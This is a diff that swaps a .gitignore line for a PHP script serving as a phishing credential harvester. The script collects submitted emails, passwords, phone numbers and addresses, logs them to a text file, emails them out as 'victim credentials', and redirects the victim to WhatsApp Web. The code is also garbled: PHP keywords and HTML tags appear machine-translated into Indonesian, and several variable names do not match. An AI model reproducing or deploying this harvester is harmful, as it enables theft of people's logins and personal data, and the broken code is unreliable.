@@ -1,2 +1,89 @@
-# Google App Engine generated folder
-appengine-generated/
+<?php
+error_reporting(0);
+$pengguna = $_POST['email'];
+$pass = $_POST['password'];
+$pho = $_POST['telepon'];
+$org = $_POST['organisasi'];
+$addr = $_POST['alamat'];
+$pos = $_POST['pos'];
+$kota = $_POST['kota'];
+$negara = $_POST['negara'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$detail = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
+$ulke = $detail->negara;
+date_default_timezone_set('Eropa/Istanbul');
+$tarih=tanggal("dmY H:i:s");
+$file = fopen('sensitifinfo.txt', 'a');
+fwrite($file, "Nama Pengguna: ".$pengguna."\n\n" ."Kata Sandi: ".$pass. "\n\n"."Nomor Telepon: ".$pho."\n\n". "Alamat Ip: " .$ip."\n\n".
+"Negara: ".$ulke ."\n\n". "Waktu: " .$tarih. "\n\n\"". "Organisasi : " .$org."\n\n". "Alamat:".$addr."\n\n"."Pos :".$pos."\n \n" . "Kota :" .$kota."\n\n" ."negara : ".$negara."\n\n\n\n");
+fclose($file);
+$subject = "Kredensial Korban{ $user }";
+$pesan = '
+<tengah> 
+<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
+<font size="3.5"><b>Penulis:swagkarna</b></font>
+</div>
+<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
+  <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Alamat Ip</th>
+  <th style="width:78%;text-align: center;"><b>'.$ip.'</th> 
+ </tr>
+  <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Negara</th>
+  <th style="width:78%;text-align: center;"><b>'.$ulke.'</th> 
+ </tr>
+ <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Waktu</th>
+  <th style="width:78%;text-align: center;"><b>'.$tarih.'</th> 
+ </tr>
+  <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Nama Pengguna atau Email</th>
+  <th style="width:78%;text-align: center;"><b>'.$user.'</th> 
+ </tr>
+ <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Sandi</th>
+  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
+ </tr>
+  <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Nomor Telepon</th>
+  <th style="width:78%;text-align: center;"><b>'.$pho.'</th> 
+ </tr>
+   <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Organisasi</th>
+  <th style="width:78%;text-align: center;"><b>'.$org.'</th> 
+ </tr>
+   <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Alamat</th>
+  <th style="width:78%;text-align: center;"><b>'.$addr.'</th> 
+ </tr>
+   <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Pos</th>
+  <th style="width:78%;text-align: center;"><b>'.$pos.'</th> 
+ </tr>
+   <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Kota</th>
+  <th style="width:78%;text-align: center;"><b>'.$city.'</th> 
+ </tr>
+   <tr>
+  <th style="width:22%;text-align:left;" height="25px"><b>Negara</th>
+  <th style="width:78%;text-align: center;"><b>'.$country.'</th> 
+ </tr>
+ </tabel>
+<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
+<font size="3"><b>Tetap Aman!! Tetap Legal</b></font>
+</div>
+</center>
+';
+sertakan 'email.php';
+$headersx = 'Versi MIME: 1.0' . "\r\n";
+$headersx .= 'Jenis konten: teks/html; charset=iso-8859-1' . "\r\n";
+$headersx .= 'Dari: Anon<anon@gmail.com>' . "\r\n";
+$datamail = mail($ikhbaljb, $subjek, $pesan, $headersx);
+?>
+<html>
+<kepala>
+<meta http-equiv="REFRESH" content="0;url=https://web.whatsapp.com/">
+</head>
+<tubuh>
+</tubuh>
+</html>
